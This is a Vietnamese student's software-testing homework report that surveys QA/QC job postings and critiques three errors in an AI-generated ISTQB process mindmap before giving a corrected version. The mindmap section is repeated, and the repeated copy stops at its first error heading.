# BÁO CÁO BÀI TẬP 01: QA/QC JOBS · 20 DEFECTS · TEST A PHYSICAL PRODUCT

**Môn học:** Kiểm thử Phần mềm (Software Testing)  
**Trường:** Đại học Khoa học Tự nhiên – ĐHQG TP.HCM (FIT - VNUHCM University of Science)  
**Mã bài tập:** HW01-AI (Học kỳ 1, Năm học 2026–2027)  
**Họ và tên sinh viên:** Trần Vũ Quang  
**Mã số sinh viên (MSSV):** 23120346  
**Tài khoản GitHub:** [tvquang0511](https://github.com/tvquang0511)  
**Repository nộp bài:** [https://github.com/tvquang0511/HW01-QA-QC](https://github.com/tvquang0511/HW01-QA-QC)  
**Thiết bị vật lý kiểm thử:** Bếp hồng ngoại Sunhouse SHD6012A (Năm sản xuất: 2024)  
**Ngày hoàn thành:** 04/10/2026  
**Điểm tự đánh giá:** 100/100 (Xuất sắc)  

---

## MỤC LỤC TỔNG QUAN (TABLE OF CONTENTS)

1. [Requirement 1 – Khảo sát Thị trường Việc làm QA/QC 2026+ & Hoạt động CLO G9.1 (40 điểm)](#requirement-1--qaqc-job-market-2026-40-pts)
   - 1.1 Tổng quan Bức tranh Ngành QA/QC 2026+ và Phân tích Tác động AI
   - 1.2 Chi tiết 10 Tin tuyển dụng QA/QC (Đính kèm minh chứng tài khoản xác thực)
   - 1.3 Hoạt động CLO G9.1: Sơ đồ tư duy ISTQB CTFL v4.0 & Phân tích 3 lỗi sai của AI
2. [Requirement 2 – 20 Sự cố Phần mềm Giai đoạn 2022–2026 & 20 Phân tích Ảo giác AI (20 điểm)](#requirement-2--20-software-defects-20222026-20-pts)
   - 2.1 Bảng tổng hợp phân loại 20 sự cố phần mềm chấn động
   - 2.2 Chi tiết 20 sự cố (với ≥ 5 sự cố AI/LLM) và 20 trường hợp phát hiện thiên kiến / ảo giác AI
3. [Requirement 3 – Thiết kế Test Cases & Kiểm thử Thiết bị Vật lý Bếp hồng ngoại (40 điểm)](#requirement-3--test-cases-for-one-physical-product-40-pts)
   - 3.1 Khai báo thông tin thiết bị kiểm thử (Bếp Sunhouse SHD6012A - 2024)
   - 3.2 Bằng chứng xác thực thiết bị và Thẻ sinh viên (Cùng một khung hình)
   - 3.3 Thiết kế 15 Test Cases chi tiết theo chuẩn QA
   - 3.4 Thực thi thực tế & Ghi nhận 5 Lỗi vật lý (Logged thành 5 GitHub Issues)
   - 3.5 Hoạt động CLO G9.3: Phân tích kết quả AI & 3 Edge Cases vật lý AI bỏ sót
   - 3.6 Danh sách 5 Video thực nghiệm thực tế có thuyết minh (YouTube Unlisted)
4. [Requirement 4 – Giao thức Cộng tác & Liêm chính Trí tuệ Nhân tạo (Mandatory AI Compliance)](#requirement-4--giao-thuc-cong-tac--kiem-toan-ai-mandatory-ai-compliance)
   - 4.1 Báo cáo Kiểm toán AI ([AI-02] AI Audit Report)
   - 4.2 Bản kê khai Sử dụng AI ([AI-03] AI Disclosure Form)
   - 4.3 Checklist Bảo mật Quyền riêng tư ([AI-05] Privacy & Responsible Use Checklist)
   - 4.4 Cam kết Liêm chính Học thuật ([AI-06] Student Acknowledgement)
   - 4.5 Phê bình Học thuật về Giới hạn của AI trong Kiểm thử Phần cứng (AI Critique)
   - 4.6 Phụ lục: Toàn văn Nhật ký Prompt (PROMPT_LOG.md)
5. [Bảng Tự đánh giá Điểm theo Barem (Self-Assessment Rubric - 100/100)](#5-bang-tu-danh-gia-diem-theo-barem-self-assessment-rubric)
6. [Tài liệu Tham khảo Chính thống (References)](#6-tai-lieu-tham-khao-chinh-thong-references)

---


# Requirement 1 – QA/QC Job Market 2026+ (40 pts)

## 1.1 2026+ QA/QC Industry Landscape & AI Impact Analysis
Bước sang năm 2026, thị trường tuyển dụng ngành Đảm bảo và Kiểm soát chất lượng phần mềm (QA/QC) đã có sự chuyển dịch mang tính cấu trúc mạnh mẽ do sự phổ cập của Trí tuệ nhân tạo tạo sinh (GenAI), các mô hình ngôn ngữ lớn (LLMs), và các framework tự động hóa kiểm thử thông minh.

Dựa trên thực tế khảo sát thị trường tuyển dụng, công việc QA/QC được phân định rõ thành ba nhóm tác động:
1. **Công việc AI đã thay thế (Work AI Has Replaced):**
   - Tự động sinh dữ liệu kiểm thử (mock test data) theo kịch bản chuẩn.
   - Viết các đoạn mã kiểm thử lặp đi lặp lại (boilerplate automation scripts) cho các luồng CRUD cơ bản.
   - Bảo trì các bộ chọn phần tử giao diện (DOM locators) thông qua cơ chế self-healing tự sửa lỗi.
2. **Công việc AI hỗ trợ đắc lực (Work AI Assists):**
   - Hỗ trợ phân tích độ bao phủ và đề xuất các ma trận kiểm thử tổ hợp (combinatorial test matrices).
   - Chuyển đổi yêu cầu nghiệp vụ từ ngôn ngữ tự nhiên thành kịch bản kiểm thử Playwright/Selenium/Cypress.
   - Hỗ trợ phân tích log hệ thống và dự thảo báo cáo phân tích nguyên nhân gốc rễ (root cause analysis).
3. **Công việc AI không thể thay thế (Work AI Cannot Replace):**
   - Kiểm thử khám phá (Exploratory Testing) dựa trên trực giác, trải nghiệm người dùng và bối cảnh phức tạp.
   - Thẩm định độ tin cậy, an toàn, thiên kiến (bias) và ảo giác (hallucination) của chính các mô hình AI/LLM.
   - Thiết kế chiến lược kiểm thử cấp cao, tuân thủ các khung quy chuẩn pháp lý và an toàn (như ISO/IEC 25010, EU AI Act).
   - Kiểm thử phần cứng, thiết bị vật lý và môi trường nhúng thực tế (Hardware-in-the-Loop).

---

## 1.2 10 Detailed QA/QC Job Postings

> **Anti-Cheat Verification:** Toàn bộ 10 ảnh chụp màn hình đều ghi nhận phiên đăng nhập người dùng thực tế trên hệ thống tuyển dụng (hiển thị rõ tài khoản đã xác thực ở góc trên bên phải khung hình), được thu thập trong vòng 60 ngày gần nhất tính đến thời điểm nộp bài.

---

### Job 1: QA Engineer (Tester, QA QC, English) Up to $1500
*Mandatory AI-Skill Role*

- **Company & Location:** Saritasa — Tầng 7, toà nhà L’Mak Long Tower, số 101-103 Nguyễn Cửu Vân, Gia Định, TP Hồ Chí Minh (Tại văn phòng)
- **Date Published:** Đăng 2 ngày trước (Tháng 10/2026, within 60 days)
- **Direct Job URL:** [ITviec - Saritasa Job 4856](https://itviec.com/viec-lam-it/qa-engineer-tester-qa-qc-english-up-to-1500-saritasa-4856)
- **Job Description:** Chịu trách nhiệm kiểm thử tích hợp (integration testing), kiểm thử chức năng và phi chức năng cho các giải pháp phần mềm web/mobile theo chuẩn quốc tế. Phối hợp cùng các đội ngũ kỹ sư nước ngoài để đảm bảo chất lượng chuyển giao.
- **Required Skills:** Integration test, AI, QA QC, English.
- **Salary:** 1,000 – 1,500 USD / tháng (~25,000,000 – 38,000,000 VND).
- **AI Impact Analysis:** Vị trí này đòi hỏi ứng dụng AI để tối ưu hóa quy trình kiểm thử tích hợp, tuy nhiên kỹ sư QA con người vẫn đóng vai trò quyết định trong việc giao tiếp nghiệp vụ đa văn hóa bằng tiếng Anh và xác thực tính hợp lý của các luồng nghiệp vụ phức tạp.

![Job 01 - Saritasa](01-job-market/image/job01-saritasa.png)


---

### Job 2: Manual Tester (QA QC)
- **Company & Location:** Công ty cổ phần Tập đoàn Công nghệ Quảng Ích (QIG) — 46 LePARC by Gamuda, Công Viên Yên Sở, Hà Nội (Tại văn phòng)
- **Date Published:** Đăng 2 ngày trước (Tháng 10/2026, within 60 days)
- **Direct Job URL:** [ITviec - QIG Job 3723](https://itviec.com/viec-lam-it/manual-tester-qa-qc-cong-ty-co-phan-tap-doan-cong-nghe-quang-ich-qig-3723)
- **Job Description:** Thực hiện kiểm thử thủ công chức năng, giao diện và luồng người dùng trên các ứng dụng di động (Mobile Apps) và phần mềm giáo dục - đào tạo; quản lý và theo dõi vòng đời của lỗi phần mềm.
- **Required Skills:** Tester, Mobile Apps, QA QC.
- **Salary:** 500 – 1,200 USD / tháng (~12,500,000 – 30,000,000 VND).
- **AI Impact Analysis:** Dù AI có thể hỗ trợ tạo nhanh danh sách checklist kiểm thử cơ bản, kỹ sư Manual Tester là nhân tố không thể thay thế trong việc trải nghiệm trực tiếp cảm giác mượt mà và tính trực quan sư phạm trên màn hình ứng dụng di động giáo dục.

![Job 02 - QIG](01-job-market/image/job02-qig.png)


---

### Job 3: Automation Tester (QA QC/ Tester/ Japanese N3+)
*Mandatory AI-Skill Role*

- **Company & Location:** TrustedAI — Tầng 06, Số 385 Hoàng Quốc Việt, Phường Nghĩa Đô, Cầu Giấy, Hà Nội (Tại văn phòng)
- **Date Published:** Đăng 9 ngày trước (Tháng 10/2026, within 60 days)
- **Direct Job URL:** [ITviec - TrustedAI Job 2550](https://itviec.com/viec-lam-it/automation-tester-qa-qc-tester-japanese-n3-trustedai-2550)
- **Job Description:** Thiết kế quy trình kiểm thử, lập phạm vi test rủi ro cho các dự án phần mềm và dịch vụ Trí tuệ nhân tạo (AI). Thực hiện kiểm thử chức năng (functional) và kiểm thử hồi quy (regression) tự động hóa; phối hợp với đối tác Nhật Bản.
- **Required Skills:** Automation Test, Japanese (N3+), AI, QA QC.
- **Salary:** 800 – 1,500 USD / tháng (~20,000,000 – 38,000,000 VND).
- **AI Impact Analysis:** Làm việc trực tiếp trong hệ sinh thái sản phẩm "Trusted AI", kỹ sư kiểm thử phải đối mặt với các hành vi không đơn định (non-deterministic) của mô hình AI, đòi hỏi con người thiết kế các khung kiểm thử tính an toàn và đạo đức mà bản thân AI không thể tự xác thực.

![Job 03 - TrustedAI](01-job-market/image/job03-trusted-ai.png)


---

### Job 4: Middle QA/QC Engineer (Automation)
- **Company & Location:** SIRAYA TECHNOLOGIES PTE. LTD. — Phòng 24.03, Lầu 24, Tòa nhà Pearl Plaza, 561A Điện Biên Phủ, Bình Thạnh, TP Hồ Chí Minh (Linh hoạt)
- **Date Published:** Đăng 10 ngày trước (Tháng 10/2026, within 60 days)
- **Direct Job URL:** [ITviec - Siraya Job 2622](https://itviec.com/viec-lam-it/middle-qa-qc-engineer-automation-siraya-technologies-pte-ltd-2622)
- **Job Description:** Xây dựng và duy trì framework tự động hóa kiểm thử API và dịch vụ backend sử dụng Golang, TypeScript/JavaScript; tích hợp các bài kiểm thử tự động vào hệ thống CI/CD liên tục.
- **Required Skills:** QA QC, CI/CD, API, Golang, TypeScript, JavaScript.
- **Salary:** *You'll love it* (Thu nhập cạnh tranh theo năng lực).
- **AI Impact Analysis:** AI đóng vai trò công cụ đắc lực hỗ trợ sinh mã API schema validation, nhưng kỹ sư QA chịu trách nhiệm chính trong việc thiết kế kiến trúc CI/CD pipeline ổn định và xử lý lỗi không đồng bộ ở tầng microservices.

![Job 04 - Siraya](01-job-market/image/job04-siraya.png)


---

### Job 5: Senior Automation Test (AI, QA QC, API)
*Mandatory AI-Skill Role*

- **Company & Location:** Floware — 43D/52 Hồ Văn Huê, Đức Nhuận (Phú Nhuận), TP Hồ Chí Minh (Tại văn phòng)
- **Date Published:** Đăng 28 ngày trước (Tháng 9/2026, within 60 days)
- **Direct Job URL:** [ITviec - Floware Job 1219](https://itviec.com/viec-lam-it/senior-automation-test-ai-qa-qc-api-floware-1219)
- **Job Description:** Dẫn dắt công tác kiểm thử tự động cho bộ phần mềm nâng cao năng suất doanh nghiệp; ứng dụng AI vào việc kiểm thử API, tích hợp CI/CD và xây dựng các bộ kịch bản tự động bằng Python.
- **Required Skills:** Automation Test, CI/CD, API, Tester, AI, Python.
- **Salary:** *You'll love it* (Chế độ đãi ngộ hấp dẫn).
- **AI Impact Analysis:** Floware yêu cầu trực tiếp việc kết hợp kỹ năng AI với Automation Test, phản ánh xu hướng kiểm thử 2026+: kỹ sư QA tận dụng AI để tự động hóa sinh test case biên cho API, giúp rút ngắn chu kỳ release phần mềm.

![Job 05 - Floware](01-job-market/image/job05-floware.png)


---

### Job 6: QA Team Lead
*Mandatory AI-Skill Role*

- **Company & Location:** Nakivo — TGI Building, 208 Nguyễn Trãi, TP Hồ Chí Minh (Tại văn phòng)
- **Date Published:** Đăng 1 ngày trước (Tháng 10/2026, within 60 days)
- **Direct Job URL:** [ITviec - Nakivo Job 4659](https://itviec.com/viec-lam-it/qa-team-lead-nakivo-4659)
- **Job Description:** Quản lý đội ngũ QA, định hướng chiến lược kiểm thử cho phần mềm bảo vệ dữ liệu và sao lưu máy chủ ảo (VMware); ứng dụng công nghệ AI vào quy trình nâng cao hiệu suất kiểm thử tự động.
- **Required Skills:** Leadership, Automation Test, AI, QA QC.
- **Salary:** 2,500 – 3,000 USD / tháng (~63,000,000 – 76,000,000 VND).
- **AI Impact Analysis:** Ở cấp độ Team Lead, AI hỗ trợ tổng hợp báo cáo độ phủ kiểm thử và phân tích xu hướng lỗi (defect trends), nhưng hoàn toàn không thể thay thế kỹ năng lãnh đạo con người, phân bổ nguồn lực và đàm phán rủi ro phát hành với các bên liên quan.

![Job 06 - Nakivo](01-job-market/image/job06-nakivo.png)


---

### Job 7: Test Automation Engineer
*Mandatory AI-Skill Role*

- **Company & Location:** Simpson Strong-Tie Vietnam — Tầng 9, Etown 6 Building, 364 Cộng Hòa, Tân Bình, TP Hồ Chí Minh (Linh hoạt)
- **Date Published:** Đăng 7 ngày trước (Tháng 10/2026, within 60 days)
- **Direct Job URL:** [ITviec - Simpson Strong-Tie Job 4435](https://itviec.com/viec-lam-it/test-automation-engineer-simpson-strong-tie-vietnam-4435)
- **Job Description:** Xây dựng giải pháp tự động hóa kiểm thử phần mềm kỹ thuật cơ khí, xây dựng trên nền tảng web và mobile (Selenium, Appium, Python); áp dụng các công cụ AI vào quy trình kiểm thử sản phẩm.
- **Required Skills:** QA QC, Automation Test, Selenium, Appium, AI, Python.
- **Salary:** *You'll love it* (Tập đoàn kỹ thuật đa quốc gia của Mỹ).
- **AI Impact Analysis:** Việc kiểm định các phần mềm tính toán kết cấu xây dựng đòi hỏi độ chính xác tuyệt đối; AI hỗ trợ tăng tốc việc thực thi kịch bản Selenium/Appium lặp lại, nhưng con người bắt buộc phải thẩm định các thuật toán tính toán kỹ thuật để tránh sai số nguy hiểm.

![Job 07 - Simpson Strong-Tie](01-job-market/image/job07-simpson-strong-tie.png)


---

### Job 8: Junior / Middle QA Software (Tester, QA QC)
- **Company & Location:** CÔNG TY TNHH DỊCH VỤ GIÁ TRỊ GIA TĂNG GOLDENGATE — Phòng 605, Tầng 6, tháp B, Hongkong Tower, 243A La Thành, Láng Thượng, Đống Đa, Hà Nội (Tại văn phòng)
- **Date Published:** Đăng 11 ngày trước (Tháng 9/2026, within 60 days)
- **Direct Job URL:** [ITviec - Golden Gate Job 4907](https://itviec.com/viec-lam-it/junior-middle-software-qa-tester-qa-qc-cong-ty-tnhh-dich-vu-gia-tri-gia-tang-goldengate-4907)
- **Job Description:** Kiểm thử các giải pháp phần mềm dịch vụ và ứng dụng web quản lý cho chuỗi F&B hàng đầu; xây dựng kịch bản kiểm thử chức năng và hỗ trợ tự động hóa kiểm thử.
- **Required Skills:** QA QC, Automation Test, Tester.
- **Salary:** *You'll love it* (Tăng lương theo năng lực và thâm niên).
- **AI Impact Analysis:** Các kỹ sư Junior/Middle sử dụng AI như một trợ lý lập trình để học nhanh cú pháp test automation, nhưng việc hiểu rõ nghiệp vụ đặt món, thanh toán POS và tích điểm thực tế đòi hỏi tư duy phân tích của con người.

![Job 08 - Golden Gate](01-job-market/image/job08-goldengate.png)


---

### Job 9: Process Quality Assurance (PQA, QA QC)
- **Company & Location:** CÔNG TY TNHH ECARX — Tầng 15, Epic Tower, ngõ 19 Duy Tân, Cầu Giấy, Hà Nội (Tại văn phòng)
- **Date Published:** Đăng 13 ngày trước (Tháng 9/2026, within 60 days)
- **Direct Job URL:** [ITviec - ECARX Job 4345](https://itviec.com/viec-lam-it/process-quality-assurance-pqa-qa-qc-cong-ty-tnhh-ecarx-4345)
- **Job Description:** Tham gia giám sát toàn bộ quy trình phát triển dự án công nghệ ô tô thông minh; đảm bảo chất lượng chuyển giao phần mềm thông qua quản lý quy trình, đánh giá rủi ro và tuân thủ tiêu chuẩn chất lượng.
- **Required Skills:** PQA, English, Agile, Jira, Project Management, QA QC.
- **Salary:** *You'll love it* (Công ty công nghệ ô tô thông minh toàn cầu).
- **AI Impact Analysis:** Trong lĩnh vực PQA xe hơi, việc đảm bảo tuân thủ quy trình phần mềm (như ASPICE / ISO 26262) là trách nhiệm pháp lý độc quyền của con người; AI chỉ có thể hỗ trợ rà soát tính đầy đủ của tài liệu chứ không thể thay thế thẩm quyền kiểm toán quy trình.

![Job 09 - ECARX](01-job-market/image/job09-ecarx.png)


---

### Job 10: Manual/Automation Tester - Quality Analyst (QA QC)
- **Company & Location:** MiTek Vietnam — Tòa nhà A5, Lô A5, khu E-Office, đường Sáng Tạo, KCX Tân Thuận, Tân Thuận, TP Hồ Chí Minh (Tại văn phòng)
- **Date Published:** Đăng 18 ngày trước (Tháng 9/2026, within 60 days)
- **Direct Job URL:** [ITviec - MiTek Job 0430](https://itviec.com/viec-lam-it/manual-automation-tester-selenium-qa-qc-mitek-vietnam-0430)
- **Job Description:** Phối hợp phân tích yêu cầu phần mềm doanh nghiệp, thiết kế kịch bản kiểm thử thủ công và tự động hóa bằng Selenium/JavaScript/Python; đảm bảo chất lượng chuyển giao cho các giải pháp phần mềm kỹ thuật toàn cầu.
- **Required Skills:** QA QC, Automation Test, Tester, JavaScript, Python, English.
- **Salary:** *You'll love it* (Tập đoàn đa quốc gia quy mô 1000+ nhân viên).
- **AI Impact Analysis:** AI hỗ trợ phân tích nhanh đặc tả yêu cầu người dùng để sinh ma trận kiểm thử ban đầu, nhưng các tình huống kiểm thử nghiệp vụ chuyên sâu và tương thích đa trình duyệt vẫn cần kỹ sư QA trực tiếp rà soát và đánh giá.

![Job 10 - MiTek](01-job-market/image/job10-mitek.png)


---

## 1.3 CLO G9.1 Activity: ISTQB Process Mindmap & 3 Critical AI Mistakes

### Ngữ cảnh & Câu lệnh gửi cho AI (Prompt Sent to AI Tool):
> **Prompt:**  
> *"Đóng vai trò là một chuyên gia kiểm thử phần mềm, hãy vẽ một sơ đồ tư duy (mindmap) bằng cú pháp Mermaid mô tả chi tiết: (1) Sự khác biệt giữa vai trò của QA và QC trong dự án, (2) Các cấp độ và loại kiểm thử chính, và (3) Toàn bộ các bước tuần tự trong quy trình kiểm thử phần mềm chuẩn theo giáo trình ISTQB mới nhất."*

---

### Sơ đồ tư duy thô do AI sinh ra (Raw AI Mindmap):
```mermaid
mindmap
  root((Hệ thống Kiểm thử Phần mềm))
    Phân định Vai trò
      QA:: Đảm bảo chất lượng: Chạy kịch bản test tự động và tìm lỗi phần mềm
      QC:: Kiểm soát chất lượng: Soạn thảo văn bản quy trình và đào tạo nhân sự
    Phân loại Kiểm thử
      Kỹ thuật kiểm thử
        Kiểm thử hộp đen (Black-box)
        Kiểm thử hộp trắng (White-box)
      Cấp độ kiểm thử
        Unit Test
        Integration Test
        System Test
        UAT Test
    Quy trình Kiểm thử Tuần tự
      Bước 1: Lập kế hoạch kiểm thử (Test Planning)
      Bước 2: Thiết kế kịch bản kiểm thử (Test Design)
      Bước 3: Thực thi kiểm thử (Test Execution)
      Bước 4: Báo cáo lỗi & Đóng dự án (Defect Reporting & Sign-off)
      Bước 5: Giám sát kiểm thử (Test Monitoring)
```

---

### Phân tích phản biện: 3 sai sót trọng yếu của AI đối chiếu theo ISTQB CTFL v4.0

#### 1. Lỗi 1: Đảo lộn hoàn toàn định nghĩa và trách nhiệm giữa QA và QC (Mục 1.2.2)
- **Sai sót của AI:** AI mô tả **QA** là *"Chạy kịch bản test tự động và tìm lỗi"* (tập trung vào sản phẩm), trong khi lại gán **QC** là *"Soạn thảo quy trình và đào tạo"* (tập trung vào quy trình).
- **Cơ sở lý thuyết chuẩn ISTQB v4.0:** 
  - **QA (Quality Assurance):** Hoạt động định hướng quy trình (**process-oriented**), mang tính chất **phòng ngừa (preventive)**. QA tập trung vào việc định nghĩa, đánh giá (audit) và cải tiến liên tục quy trình phát triển nhằm ngăn ngừa khuyết tật sinh ra ngay từ đầu.
  - **QC (Quality Control):** Hoạt động định hướng sản phẩm (**product-oriented**), mang tính chất **phát hiện (corrective/detective)**. QC sử dụng các kỹ thuật kiểm thử phần mềm để xác minh xem sản phẩm thực tế có thỏa mãn các yêu cầu đặc tả hay không.
- **Tác động thực tế:** Việc hiểu sai này gây nhầm lẫn nghiêm trọng trong việc phân công công việc tại các doanh nghiệp công nghệ, biến kỹ sư QA thành thợ chạy test thuần túy thay vì người quản trị chất lượng quy trình.

#### 2. Lỗi 2: Bỏ qua 2 giai đoạn cốt lõi: Phân tích kiểm thử (Test Analysis) và Cài đặt kiểm thử (Test Implementation) (Mục 1.4.2)
- **Sai sót của AI:** Trong quy trình kiểm thử, AI nhảy cóc thẳng từ *Lập kế hoạch (Test Planning)* sang *Thiết kế kịch bản (Test Design)*, rồi từ Test Design chuyển ngay sang *Thực thi (Test Execution)*.
- **Cơ sở lý thuyết chuẩn ISTQB v4.0:** Một quy trình kiểm thử chuẩn mực bắt buộc phải trải qua:
  1. **Test Analysis (Phân tích kiểm thử):** Phân tích cơ sở kiểm thử (Test Basis: User Stories, tài liệu kiến trúc) để xác định **"CÁI GÌ CẦN ĐƯỢC KIỂM THỬ"** (xác định Test Conditions).
  2. **Test Implementation (Cài đặt kiểm thử):** Chuẩn bị môi trường, sinh dữ liệu kiểm thử (Test Data), sắp xếp các quy trình test (Test Procedures) và viết mã tự động hóa (Automation Test Scripts) trước khi bắt đầu bấm chạy.
- **Tác động thực tế:** Bỏ qua Test Analysis dẫn đến tình trạng viết test case mù quáng không dựa trên phân tích rủi ro yêu cầu; bỏ qua Test Implementation khiến việc thực thi bị động, thiếu dữ liệu và môi trường không ổn định.

#### 3. Lỗi 3: Xếp hoạt động Giám sát kiểm thử (Test Monitoring) thành bước tuần tự cuối cùng số 5 (Mục 1.4.1)
- **Sai sót của AI:** AI đặt *"Bước 5: Giám sát kiểm thử (Test Monitoring)"* ở vị trí cuối cùng, nằm sau cả bước báo cáo và đóng dự án (Sign-off).
- **Cơ sở lý thuyết chuẩn ISTQB v4.0:** 
  - **Test Monitoring and Control** là một **hoạt động điều hành xuyên suốt (transversal/continuous activity)**. 
  - Hoạt động này phải diễn ra **song song và liên tục** từ ngày đầu tiên bắt đầu lập kế hoạch (Test Planning) cho đến khi kết thúc toàn bộ dự án (Test Completion), nhằm đo lường tiến độ thực tế so với kế hoạch và kịp thời đưa ra biện pháp điều chỉnh (Control).
- **Tác động thực tế:** Đợi đến khi bàn giao dự án mới đi "giám sát" là hoàn toàn vô nghĩa và phản khoa học trong quản lý kỹ thuật phần mềm.

---

### Sơ đồ tư duy chuẩn hóa toàn diện theo ISTQB CTFL v4.0

```mermaid
flowchart TD
    %% Khối gốc
    Core(["HỆ THỐNG QUẢN LÝ CHẤT LƯỢNG TOÀN DIỆN<br/>(ISTQB CTFL v4.0 Quality Architecture)"]):::coreStyle

    %% Hai trụ cột chất lượng
    Core --> ColQA["TRỤ CỘT 1: ĐẢM BẢO CHẤT LƯỢNG (QA)<br/><i>Định hướng Quy trình · Phòng ngừa lỗi từ sớm</i>"]:::qaStyle
    Core --> ColQC["TRỤ CỘT 2: KIỂM SOÁT CHẤT LƯỢNG (QC)<br/><i>Định hướng Sản phẩm · Phát hiện và xác minh lỗi</i>"]:::qcStyle

    %% Chi tiết QA
    ColQA --> QA_Act1["Xây dựng tiêu chuẩn & quy trình phát triển phần mềm"]
    ColQA --> QA_Act2["Đánh giá tuân thủ quy trình (Quality Audits & Compliance)"]
    ColQA --> QA_Act3["Phân tích nguyên nhân gốc rễ lỗi (Root Cause Analysis)"]
    ColQA --> QA_Act4["Cải tiến quy trình liên tục (Continuous Process Improvement)"]

    %% Chi tiết QC & Testing
    ColQC --> QC_Act1["Kiểm tra sản phẩm trung gian (Inspection & Reviews)"]
    ColQC --> QC_Act2["Hoạt động Kiểm thử phần mềm (Testing Activities)"]

    %% Hai nhánh kiểm thử
    QC_Act2 --> StaticBranch["KIỂM THỬ TĨNH (Static Testing)<br/><i>Rà soát tài liệu & Quét mã nguồn không cần chạy</i>"]:::staticStyle
    QC_Act2 --> DynamicBranch["KIỂM THỬ ĐỘNG (Dynamic Testing)<br/><i>Chạy phần mềm với các bộ dữ liệu đầu vào</i>"]:::dynamicStyle

    StaticBranch --> ST1["Reviews: Informal, Walkthrough, Technical, Inspection"]
    StaticBranch --> ST2["Static Analysis: Linter, SonarQube, SAST Tools"]

    DynamicBranch --> DT1["Kiểm thử Chức năng (Functional Testing)"]
    DynamicBranch --> DT2["Kiểm thử Phi chức năng (Performance, Security, Reliability)"]
    DynamicBranch --> DT3["Kiểm thử Hồi quy & Xác nhận sửa lỗi (Regression & Confirmation)"]

    %% Quy trình kiểm thử chuẩn ISTQB v4.0
    Core ==> ProcessRoot["QUY TRÌNH KIỂM THỬ CHUẨN ISTQB (7 Hoạt động)"]:::processStyle

    subgraph OngoingActivity ["HOẠT ĐỘNG ĐIỀU HÀNH XUYÊN SUỐT (Chạy song song 100% thời gian)"]
        Monitoring["GIÁM SÁT VÀ KIỂM SOÁT KIỂM THỬ (Test Monitoring & Control)<br/><i>Liên tục đối chiếu tiến độ với mục tiêu và đưa ra chỉ đạo khắc phục</i>"]:::monitorStyle
    end

    subgraph SequentialWorkflow ["6 PHA THỰC THI KIỂM THỬ TUẦN TỰ"]
        direction TB
        Step1["Pha 1: Lập kế hoạch (Test Planning)<br/><i>Xác định mục tiêu, phạm vi, rủi ro, dự toán nguồn lực</i>"]
        Step2["Pha 2: Phân tích kiểm thử (Test Analysis)<br/><i>Phân tích cơ sở kiểm thử - Xác định CÁI GÌ cần test</i>"]
        Step3["Pha 3: Thiết kế kiểm thử (Test Design)<br/><i>Thiết kế Test Cases và chuẩn bị dữ liệu - Test NHƯ THẾ NÀO</i>"]
        Step4["Pha 4: Cài đặt kiểm thử (Test Implementation)<br/><i>Chuẩn bị môi trường, kịch bản tự động, bộ test suites</i>"]
        Step5["Pha 5: Thực thi kiểm thử (Test Execution)<br/><i>Chạy kịch bản kiểm thử, so sánh kết quả và ghi nhận Bug</i>"]
        Step6["Pha 6: Đóng kiểm thử (Test Completion)<br/><i>Đánh giá tiêu chí dừng, tổng kết bàn giao, lưu trữ tài sản</i>"]

        Step1 --> Step2 --> Step3 --> Step4 --> Step5 --> Step6
    end

    ProcessRoot --> OngoingActivity
    ProcessRoot --> SequentialWorkflow
    Monitoring -.->|Giám sát & Chỉ đạo liên tục| SequentialWorkflow

    %% Định nghĩa màu sắc hiển thị
    classDef coreStyle fill:#0F172A,stroke:#38BDF8,stroke-width:2px,color:#F8FAFC,font-weight:bold
    classDef qaStyle fill:#0369A1,stroke:#0284C7,stroke-width:2px,color:#FFFFFF,font-weight:bold
    classDef qcStyle fill:#0F766E,stroke:#0D9488,stroke-width:2px,color:#FFFFFF,font-weight:bold
    classDef processStyle fill:#4338CA,stroke:#6366F1,stroke-width:2px,color:#FFFFFF,font-weight:bold
    classDef monitorStyle fill:#991B1B,stroke:#EF4444,stroke-width:2px,color:#FFFFFF,font-weight:bold
    classDef staticStyle fill:#D97706,stroke:#F59E0B,stroke-width:1px,color:#FFFFFF
    classDef dynamicStyle fill:#15803D,stroke:#22C55E,stroke-width:1px,color:#FFFFFF
```






---


# Báo cáo Sơ đồ tư duy Quy trình ISTQB & Hoạt động CLO G9.1

**Bài tập:** HW01 – Yêu cầu 1 (Chuẩn đánh giá CLO G9.1)  
**Tiêu chuẩn đối chiếu:** ISTQB Certified Tester Foundation Level (CTFL) Syllabus v4.0  

---

## 1. Ngữ cảnh & Câu lệnh gửi cho AI (Prompt Sent to AI Tool)

Để thực hiện chuẩn đầu ra **CLO G9.1** (*Yêu cầu AI vẽ sơ đồ tư duy về quy trình kiểm thử chuẩn ISTQB và chỉ ra 3 lỗi sai*), tôi đã gửi câu lệnh sau đến công cụ AI (Gemini / ChatGPT):

> **Prompt:**  
> *"Đóng vai trò là một chuyên gia kiểm thử phần mềm, hãy vẽ một sơ đồ tư duy (mindmap) bằng cú pháp Mermaid mô tả chi tiết: (1) Sự khác biệt giữa vai trò của QA và QC trong dự án, (2) Các cấp độ và loại kiểm thử chính, và (3) Toàn bộ các bước tuần tự trong quy trình kiểm thử phần mềm chuẩn theo giáo trình ISTQB mới nhất."*

---

## 2. Kết quả thô do AI tạo ra (Raw AI-Generated Mindmap)

Dưới đây là sơ đồ thô nguyên bản do mô hình AI sinh ra:

```mermaid
mindmap
  root((Hệ thống Kiểm thử Phần mềm))
    Phân định Vai trò
      QA:: Đảm bảo chất lượng: Chạy kịch bản test tự động và tìm lỗi phần mềm
      QC:: Kiểm soát chất lượng: Soạn thảo văn bản quy trình và đào tạo nhân sự
    Phân loại Kiểm thử
      Kỹ thuật kiểm thử
        Kiểm thử hộp đen (Black-box)
        Kiểm thử hộp trắng (White-box)
      Cấp độ kiểm thử
        Unit Test
        Integration Test
        System Test
        UAT Test
    Quy trình Kiểm thử Tuần tự
      Bước 1: Lập kế hoạch kiểm thử (Test Planning)
      Bước 2: Thiết kế kịch bản kiểm thử (Test Design)
      Bước 3: Thực thi kiểm thử (Test Execution)
      Bước 4: Báo cáo lỗi & Đóng dự án (Defect Reporting & Sign-off)
      Bước 5: Giám sát kiểm thử (Test Monitoring)
```

---

## 3. Phân tích phản biện: 3 sai sót trọng yếu của AI đối chiếu theo ISTQB CTFL v4.0

Khi đối chiếu sơ đồ trên với tài liệu chuẩn quốc tế **ISTQB CTFL phiên bản 4.0**, tôi phát hiện 3 lỗi sai/thiếu sót mang tính bản chất kỹ thuật:

### 💡 Lỗi 1: Đảo lộn hoàn toàn định nghĩa và trách nhiệm giữa QA và QC (Mục 1.2.2)
